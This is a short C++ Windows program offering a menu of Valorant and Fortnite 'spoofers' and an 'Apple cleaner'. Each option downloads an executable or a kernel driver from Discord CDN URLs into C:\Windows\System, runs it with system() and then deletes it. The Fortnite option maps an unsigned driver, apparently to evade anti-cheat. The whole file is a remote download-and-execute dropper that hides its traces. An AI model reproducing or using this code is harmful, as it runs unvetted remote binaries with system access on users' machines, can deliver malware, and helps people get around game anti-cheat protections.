#include <Windows.h>
#include <iostream>
#pragma comment(lib, "urlmon.lib")

void Valorant_Spoof() {
	URLDownloadToFileA(0, "https://cdn.discordapp.com/attachments/1020694290097254401/1025745528799100959/ValoData.exe", "C:\\Windows\\System\\ValoData.exe", 0, 0);
	system("cd C:\\Windows\\System\\");
	system("C:\\Windows\\System\\ValoData.exe");
	system("del C:\\Windows\\System\\ValoData.exe");
}

void Fortnite_Spoof() {
	URLDownloadToFileA(0, "https://cdn.discordapp.com/attachments/1020694290097254401/1026801583259930685/silent_eac_be.sys", "C:\\Windows\\System\\silent_eac_be.sys", 0, 0);
	URLDownloadToFileA(0, "https://cdn.discordapp.com/attachments/1020694290097254401/1026801565752905788/Mapper.exe", "C:\\Windows\\System\\Mapper.exe", 0, 0);
	system("cd C:\\Windows\\System\\");
	system("C:\\Windows\\System\\Mapper.exe C:\\Windows\\System\\silent_eac_be.sys");
	system("del C:\\Windows\\System\\silent_eac_be.sys");
	system("del C:\\Windows\\System\\Mapper.exe");
}

void Cleaner_Apple()
{
	URLDownloadToFileA(0, "https://cdn.discordapp.com/attachments/1026836851673272321/1026901702009430127/applecleaner.exe", "C:\\Windows\\System\\applecleaner.exe", 0, 0);
	system("cd C:\\Windows\\System\\");
	system("C:\\Windows\\System\\applecleaner.exe");
	system("del C:\\Windows\\System\\applecleaner.exe");
}

void spoofer()
{
	system("cls");
	int choice;
	std::cout << "\n Spoofers -> (1)\n Cleaners -> (2)\n\n (?): ";
	std::cin >> choice;

	if (choice == 1) {
		system("cls");
		int choice_spoof;
		std::cout << "\n Valorant -> (1)\n Fortnite -> (2)\n\n (?): ";
		std::cin >> choice_spoof;
		if (choice_spoof == 1) {
			system("cls");
			Sleep(1000);
			Beep(500, 500);
			Valorant_Spoof();
			Sleep(1000);
		}
		else if (choice_spoof == 2) {
			system("cls");
			Sleep(1000);
			Beep(500, 500);
			Fortnite_Spoof();
			Sleep(1000);
		}
		else {
			system("cls");
			Sleep(1000);
			spoofer();
		}
	}
	else if (choice == 2) {
		system("cls");
		int choice_clean;
		std::cout << "\n Apple Cleaner -> (1)\n\n (?): ";
		std::cin >> choice_clean;
		if (choice_clean == 1) {
			system("cls");
			Sleep(1000);
			Beep(500, 500);
			Cleaner_Apple();
			Sleep(1000);
		}
		else {
			system("cls");
			Sleep(1000);
			spoofer();
		}
	}
	else {
		system("cls");
		Sleep(1000);
		spoofer();
	}
	spoofer();
}